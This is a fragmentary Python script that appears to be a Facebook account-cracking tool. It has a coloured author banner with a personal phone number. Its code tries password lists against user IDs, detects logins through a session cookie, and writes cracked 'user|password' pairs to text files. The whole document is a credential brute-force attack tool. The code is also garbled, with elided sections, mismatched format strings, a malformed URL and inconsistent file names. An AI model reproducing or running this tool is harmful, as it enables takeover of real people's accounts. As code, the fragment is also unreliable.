...
█▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄█
\033[1;91m╔═════════════════════════════════════════════╗
\033[1;91m║\033[1;93m* \033[1;97mAuthor   \033[1;91m: \033[1;33m [Chancuters] \033[1;91m                  ║
\033[1;91m║\033[1;93m* \033[1;97mGitHub   \033[1;91m: \033[1;92m https//:github.com/Changcuters \033[1;91m║
\033[1;94m║\033[1;93m* \033[1;97mWhastapp \033[1;91m: \033[1;98m 082261310817  \033[1;95m[Chang] \033[1;96m[Cuters] \033[1;95m║
\033[1;94m╚═══════════════════════\033[1;94m══════════════════════╝"""
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97mRIAZ_OK.txt' % (H, P, str(len(ok))))
	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97mSSB_CP.txt' % (H, P, str(len(cp))))
	    input("\x1b[1;97mPress enter to back RIAZ Menu ")
	    sarfraz()
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r \x1b[1;97m[Chang] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    try:
                        ...
                        print('\r%s [Chan-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('Chang_CP.txt' , 'a').write('%s\n' % wrt)
                        break
                        ...
                        pass
                    print('\r%s [Chang-CP] %s | %s ' % (M, user, pw))
                    wrt = '%s|%s' % (user,pw)
                    cp.append(wrt)
                    open('Chang_CP.txt' , 'a').write('%s\n' % wrt)
                    break
